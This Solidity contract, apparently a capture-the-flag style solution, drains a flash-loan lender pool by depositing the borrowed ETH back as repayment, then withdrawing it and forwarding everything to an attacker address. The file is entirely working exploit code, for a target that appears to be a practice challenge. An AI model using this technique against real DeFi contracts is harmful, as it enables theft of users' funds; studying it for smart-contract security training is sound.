// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract HackSideEntrance {

    SideEntranceLenderPool private immutable pool;
    address payable private attacker;

    constructor (address _poolAddress, address payable _attacker) {
        pool = SideEntranceLenderPool(_poolAddress);
        attacker = _attacker;
    }

    fallback() external payable {}

    // Forward any recieved ether to the attacker address
    receive() external payable {
        (bool sent, ) = attacker.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    function hack() external {
        
        // Get the balance of ETH held by the pool
        uint256 balance = address(pool).balance;

        // Flash-loan the entire balance. This will call the execute function
        pool.flashLoan(balance);

        // Withdraw all ETH
        pool.withdraw();
    }

    function execute() external payable {
        // Deposit the full amount in the pool
        pool.deposit{value: msg.value}();
    }

}
